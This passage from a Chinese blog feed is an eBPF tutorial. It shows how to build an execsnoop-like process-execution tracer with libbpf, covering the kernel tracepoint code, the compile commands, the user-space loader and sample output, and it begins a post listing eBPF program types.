class="type">pid_t</span>);</span><br><span class="line">    __type(value, <span class="keyword">struct</span> event);</span><br><span class="line">&#125; execs <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义性能事件映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);</span><br><span class="line">    __uint(key_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">    __uint(value_size, <span class="keyword">sizeof</span>(u32));</span><br><span class="line">&#125; events <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;.maps&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execve跟踪点</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 待实现处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execve跟踪点</span></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 待实现处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义许可证（前述的BCC默认使用GPL）</span></span><br><span class="line"><span class="type">char</span> LICENSE[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;Dual BSD/GPL&quot;</span>;</span><br></pre></td></tr></table></figure><p>让我们来看看这段代码的具体含义：</p><ul><li>头文件 <code>vmlinux.h</code> 包含了内核数据结构，而 <code>bpf/bpf_helpers.h</code> 包含了之前提到的 BPF 辅助函数；</li><li><code>struct event</code> 定义了进程基本信息数据结构，它会用在后面的哈希映射中；</li><li><code>SEC(&quot;.maps&quot;)</code> 定义了哈希映射和性能事件映射；</li><li><code>SEC(&quot;tracepoint/&lt;跟踪点名称&gt;&quot;)</code> 定义了跟踪点处理函数，系统调用跟踪点的格式是  <code>tracepoint/syscalls/&lt;系统调用名称&gt;&quot;</code>。以后你需要定义内核插桩和用户插桩的时候，也是以类似的格式定义，比如 <code>kprobe/do_unlinkat</code>  或  <code>uprobe/func</code>；</li><li>最后的  <code>SEC(&quot;license&quot;)</code>  定义了 eBPF 程序的许可证。在上述的 BCC eBPF 程序中，我们并没有定义许可证，这是因为 BCC 自动帮你使用了 GPL 许可。</li></ul><p>有了基本的程序结构，接下来就是<strong>实现系统调用入口和出口跟踪点的处理函数</strong>。它们的基本过程跟上述的 BCC 程序是类似的。</p><h3 id="入口跟踪点处理-1"><a href="#入口跟踪点处理-1" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点 <code>sys_enter_execve</code> 的处理，还是按照上述 BCC 程序的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。完整代码如下所示，具体每一步的内容我都加了详细的注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_enter_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_enter</span></span><br><span class="line"><span class="params">                       *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **args = (<span class="type">const</span> <span class="type">char</span> **)(ctx-&gt;args[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *argp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询PID</span></span><br><span class="line">    u64 id = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="type">pid_t</span> pid = (<span class="type">pid_t</span>) id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存一个空的event到哈希映射中</span></span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(&amp;execs, &amp;pid, &amp;empty_event, BPF_NOEXIST)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化event变量</span></span><br><span class="line">    event-&gt;pid = pid;</span><br><span class="line">    event-&gt;args_count = <span class="number">0</span>;</span><br><span class="line">    event-&gt;args_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询第一个参数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = bpf_probe_read_user_str(event-&gt;args, ARGSIZE,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)ctx-&gt;args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;= ARGSIZE) &#123;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询其他参数</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[i]);</span><br><span class="line">        <span class="keyword">if</span> (!argp)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (event-&gt;args_size &gt; LAST_ARG)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ret =</span><br><span class="line">            bpf_probe_read_user_str(&amp;event-&gt;args[event-&gt;args_size],</span><br><span class="line">                        ARGSIZE, argp);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; ARGSIZE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        event-&gt;args_count++;</span><br><span class="line">        event-&gt;args_size += ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再尝试一次，确认是否还有未读取的参数</span></span><br><span class="line">    bpf_probe_read_user(&amp;argp, <span class="keyword">sizeof</span>(argp), &amp;args[TOTAL_MAX_ARGS]);</span><br><span class="line">    <span class="keyword">if</span> (!argp)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果还有未读取参数，则增加参数数量（用于输出&quot;...&quot;）</span></span><br><span class="line">    event-&gt;args_count++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，你需要注意这三点：</p><ul><li>第一，程序使用了 <code>bpf_probe_read_user()</code>  来查询参数。由于它把 <code>\0</code>  也算到了已读取参数的长度里面，所以最终 <code>event-&gt;args</code> 中保存的各个参数是以 <code>\0</code>  分隔的。在用户态程序输出参数之前，需要用空格替换  <code>\0</code>。</li><li>第二，程序在一开始的时候向哈希映射存入了一个空事件，在后续出口跟踪点处理的时候需要确保空事件也能正确清理。</li><li>第三，程序在最后又尝试多读取了一次参数列表。如果还有未读取参数，参数数量增加了 1。用户态程序可以根据参数数量来决定是不是需要在参数结尾输出一个 <code>...</code>。</li></ul><h3 id="出口跟踪点处理-1"><a href="#出口跟踪点处理-1" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点处理好之后，再来看看出口跟踪点的处理方法。它的步骤跟 BCC 程序也是类似的，也是查询进程基本信息、填充返回值、提交到性能事件映射这三个步骤。</p><p>除此之外，由于刚才入口跟踪点的处理中没有读取进程名称，所以在提交性能事件之前还需要先查询一下进程名称。完整的程序如下所示，具体每一步的内容我也加了详细的注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_exit_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">tracepoint__syscalls__sys_exit_execve</span><span class="params">(<span class="keyword">struct</span> trace_event_raw_sys_exit *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    u64 id;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">event</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从哈希映射中查询进程基本信息</span></span><br><span class="line">    id = bpf_get_current_pid_tgid();</span><br><span class="line">    pid = (<span class="type">pid_t</span>) id;</span><br><span class="line">    event = bpf_map_lookup_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (!event)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新返回值和进程名称</span></span><br><span class="line">    ret = ctx-&gt;ret;</span><br><span class="line">    event-&gt;retval = ret;</span><br><span class="line">    bpf_get_current_comm(&amp;event-&gt;comm, <span class="keyword">sizeof</span>(event-&gt;comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交性能事件</span></span><br><span class="line">    <span class="type">size_t</span> len = EVENT_SIZE(event);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="keyword">sizeof</span>(*event))</span><br><span class="line">        bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, event,</span><br><span class="line">                      len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理哈希映射</span></span><br><span class="line">    bpf_map_delete_elem(&amp;execs, &amp;pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这些代码中你可以看到，它的处理逻辑跟上述的 BCC 程序基本上是相同的。不过，详细对比一下，你会发现它们之间还是有不同的，不同点主要在两个方面：</p><ul><li>第一，函数名的定义格式不同。BCC 程序使用的是 <code>TRACEPOINT_PROBE</code> 宏，而 libbpf 程序用的则是  <code>SEC</code>  宏。</li><li>第二，映射的访问方法不同。BCC 封装了很多更易用的映射访问函数（如 <code>tasks.lookup()</code>），而 libbpf 程序则需要调用 05 讲 提到过的 BPF 辅助函数（比如查询要使用 <code>bpf_map_lookup_elem()</code>）。</li></ul><p>到这里，新建一个目录，并把上述代码存入 <code>execsnoop.bpf.c</code> 文件中，eBPF 部分的代码也就开发好了。</p><h3 id="编译并生成脚手架头文件"><a href="#编译并生成脚手架头文件" class="headerlink" title="编译并生成脚手架头文件"></a>编译并生成脚手架头文件</h3><p>有了 eBPF 程序，执行下面的命令，你就可以使用 clang 和 bpftool 将其编译成 BPF 字节码，然后再生成其脚手架头文件  <code>execsnoop.skel.h</code> （注意，脚手架头文件的名字一般定义为  <code>&lt;程序名&gt;.skel.h</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c execsnoop.bpf.c -o execsnoop.bpf.o</span><br><span class="line">bpftool gen skeleton execsnoop.bpf.o &gt; execsnoop.skel.h</span><br></pre></td></tr></table></figure><p>其中，clang 的参数 <code>-target bpf</code>  表示要生成 BPF 字节码，<code>-D__TARGET_ARCH_x86_64</code>  表示目标的体系结构是 <code>x86_64</code>，而  <code>-I</code>  则是引入头文件路径。</p><p>命令执行后，脚手架头文件会放到 <code>execsnoop.skel.h</code>  中，这个头文件包含了 BPF 字节码和相关的管理函数。因而，当用户态程序引入这个头文件并编译之后，只需要分发最终用户态程序生成的二进制文件到生产环境即可（如果用户态程序使用了其他的动态库，还需要分发动态库）。</p><h3 id="开发用户态程序"><a href="#开发用户态程序" class="headerlink" title="开发用户态程序"></a>开发用户态程序</h3><p>有了脚手架头文件之后，还剩下最后一步，也就是用户态程序的开发。</p><p>同 BCC 的 Python 前端程序类似，libbpf 用户态程序也需要 eBPF 程序加载、挂载到跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤。虽然 C 语言听起来可能比 Python 语言麻烦一些，但实际上，这几个步骤都可以通过脚手架头文件中自动生成的函数来完成。</p><p>下面是忽略了错误处理逻辑之后，用户态程序的一个基本框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入脚手架头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;execsnoop.skel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C语言主函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 定义BPF程序和性能事件缓冲区</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">execsnoop_bpf</span> *<span class="title">skel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer_opts</span> <span class="title">pb_opts</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer</span> *<span class="title">pb</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 设置调试输出函数</span></span><br><span class="line">    libbpf_set_print(libbpf_print_fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 增大 RLIMIT_MEMLOCK（默认值通常太小，不足以存入BPF映射的内容）</span></span><br><span class="line">    bump_memlock_rlimit();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 初始化BPF程序</span></span><br><span class="line">    skel = execsnoop_bpf__open();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 加载BPF字节码</span></span><br><span class="line">    err = execsnoop_bpf__load(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 挂载BPF字节码到跟踪点</span></span><br><span class="line">    err = execsnoop_bpf__attach(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 配置性能事件回调函数</span></span><br><span class="line">    pb_opts.sample_cb = handle_event;</span><br><span class="line">    pb = perf_buffer__new(bpf_map__fd(skel-&gt;maps.events), <span class="number">64</span>, &amp;pb_opts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 从缓冲区中循环读取数据</span></span><br><span class="line">    <span class="keyword">while</span> ((err = perf_buffer__poll(pb, <span class="number">100</span>)) &gt;= <span class="number">0</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>execsnoop_</code>  开头的数据结构和函数都包含在脚手架头文件 <code>execsnoop.skel.h</code> 中。而具体到每一步的含义如下：</p><ul><li>第 1 步的调试输出函数中，可以调用 <code>printf()</code> 把调试信息输出到终端中。</li><li>第 2 步增大锁定内存限制 <code>RLIMIT_MEMLOCK</code> 是必要的，因为系统默认的锁定内存通常过小，无法满足 BPF 映射的需要。</li><li>第 3~5 步，直接调用脚手架头文件中的函数，加载 BPF 字节码并挂载到跟踪点。</li><li>第 6~7 步为性能事件设置回调函数，并从缓冲区中循环读取数据。注意，性能事件映射  <code>skel-&gt;maps.events</code>  也是 bpftool 自动帮你生成好的。</li></ul><p>接下来，在性能事件回调函数中，把数据格式转换为 <code>struct event</code>  格式之后，由于参数列表是使用  <code>\0</code>  来分割的，并不能直接向终端打印所有参数。所以，还需要把  <code>\0</code>  先替换为空格，然后再打印。完整的回调函数如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 性能事件回调函数(向终端中打印进程名、PID、返回值以及参数)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_event</span><span class="params">(<span class="type">void</span> *ctx, <span class="type">int</span> cpu, <span class="type">void</span> *data, __u32 data_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">e</span> =</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-16s %-6d %3d &quot;</span>, e-&gt;comm, e-&gt;pid, e-&gt;retval);</span><br><span class="line">    print_args(e);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印参数（替换&#x27;\0&#x27;为空格）</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">print_args</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> event *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> args_counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e-&gt;args_size &amp;&amp; args_counter &lt; e-&gt;args_count; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c = e-&gt;args[i];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 把&#x27;\0&#x27;替换为空格</span></span><br><span class="line">            args_counter++;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;args_count &gt; TOTAL_MAX_ARGS) &#123;</span><br><span class="line">        <span class="comment">// 过长的参数输出&quot;...&quot;替代</span></span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot; ...&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的代码保存到  <code>execsnoop.c</code>  文件中，然后执行下面的命令，将其编译为可执行文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -Wall -I . -c execsnoop.c -o execsnoop.o</span><br><span class="line">clang -Wall -O2 -g execsnoop.o -static -lbpf -lelf -lz -o execsnoop</span><br></pre></td></tr></table></figure><p>最后，执行 <code>execsnoop</code>，你就可以得到如下的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./execsnoop</span><br><span class="line">COMM             PID    RET ARGS</span><br><span class="line">sh               276871   0 /bin/sh -c <span class="built_in">which</span> ps</span><br><span class="line"><span class="built_in">which</span>            276872   0 /usr/bin/which ps</span><br></pre></td></tr></table></figure><p>你还可以直接把这个文件复制到开启了 BTF 的其他机器中，无需安装额外的 LLVM 开发工具和内核头文件，也可以直接执行。</p><p>如果命令失败，并且你看到如下的错误，这说明当前机器没有开启 BTF，需要重新编译内核开启 BTF 才可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to load and verify BPF skeleton</span><br></pre></td></tr></table></figure><blockquote><p>虽然这三种方法的步骤和实现代码各不相同，但实际上它们的实现逻辑都是类似的，无非就是找出跟踪点，然后在 eBPF 部分获取想要的数据并保存到 BPF 映射中，最后在用户空间程序中读取 BPF 映射的内容并输出出来。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在实际的应用中，这三种方法有不同的使用场景：</p><ul><li>bpftrace 通常用在<strong>快速排查和定位系统</strong>上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序；</li><li>BCC 通常用在<strong>开发复杂的 eBPF 程序</strong>中，它内置的各种小工具也是目前应用最为广泛的 eBPF 小程序；</li><li>libbpf 是<strong>从内核中抽离出来的标准库</strong>，用它开发的 eBPF 程序可以直接分发执行，不再需要在每台机器上都安装 LLVM 和内核头文件。</li></ul><p>通常情况下，你可以用 bpftrace 或 BCC 做一些快速原型，验证你的设计思路是不是可行，然后再切换到 libbpf ，开发完善的 eBPF 程序后再去分发执行。这样，不仅 eBPF 程序运行得更快（无需编译步骤），还避免了在运行环境中安装开发工具和内核头文件。</p><p>在不支持 BTF 的机器中，如果不想在运行 eBPF 时依赖于 LLVM 编译和内核头文件，你还可以参考内核中的  BPF 示例，直接引用内核源码中的 <code>tools/lib/bpf/</code>  库，以及内核头文件中的数据结构，来开发 eBPF 程序。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 内核跟踪，eBPF 学习（四）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 程序的触发机制及其应用场景</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</id>
    <published>2023-08-06T05:53:33.000Z</published>
    <updated>2023-08-09T02:23:05.088Z</updated>
    
    <content type="html"><![CDATA[<p>各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）</p><span id="more"></span><h1 id="各类-eBPF-程序的触发机制及其应用场景"><a href="#各类-eBPF-程序的触发机制及其应用场景" class="headerlink" title="各类 eBPF 程序的触发机制及其应用场景"></a>各类 eBPF 程序的触发机制及其应用场景</h1><p>在上一讲中曾也提到，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。</p><p>那么，eBPF 程序都有哪些类型，而不同类型的 eBPF 程序又有哪些独特的应用场景呢？今天，就一起来看看。</p><h2 id="几类-eBPF-程序"><a href="#几类-eBPF-程序" class="headerlink" title="几类 eBPF 程序"></a>几类 eBPF 程序</h2><p>eBPF 程序类型决定了一个 eBPF 程序可以挂载的事件类型和事件参数，这也就意味着，内核中不同事件会触发不同类型的 eBPF 程序。</p><p>根据内核头文件 <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L908">include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a> 中  bpf_prog_type 的定义，Linux 内核 v5.13 已经支持 30 种不同类型的 eBPF 程序（注意， <code>BPF_PROG_TYPE_UNSPEC</code> 表示未定义）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> &#123;</span></span><br><span class="line">  BPF_PROG_TYPE_UNSPEC, <span class="comment">/* Reserve 0 as invalid program type */</span></span><br><span class="line">  BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">  BPF_PROG_TYPE_KPROBE,</span><br><span class="line">  BPF_PROG_TYPE_SCHED_CLS,</span><br><span class="line">  BPF_PROG_TYPE_SCHED_ACT,</span><br><span class="line">  BPF_PROG_TYPE_TRACEPOINT,</span><br><span class="line">  BPF_PROG_TYPE_XDP,</span><br><span class="line">  BPF_PROG_TYPE_PERF_EVENT,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SKB,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCK,</span><br><span class="line">  BPF_PROG_TYPE_LWT_IN,</span><br><span class="line">  BPF_PROG_TYPE_LWT_OUT,</span><br><span class="line">  BPF_PROG_TYPE_LWT_XMIT,</span><br><span class="line">  BPF_PROG_TYPE_SOCK_OPS,</span><br><span class="line">  BPF_PROG_TYPE_SK_SKB,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_DEVICE,</span><br><span class="line">  BPF_PROG_TYPE_SK_MSG,</span><br><span class="line">  BPF_PROG_TYPE_RAW_TRACEPOINT,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCK_ADDR,</span><br><span class="line">  BPF_PROG_TYPE_LWT_SEG6LOCAL,</span><br><span class="line">  BPF_PROG_TYPE_LIRC_MODE2,</span><br><span class="line">  BPF_PROG_TYPE_SK_REUSEPORT,</span><br><span class="line">  BPF_PROG_TYPE_FLOW_DISSECTOR,</span><br><span class="line">  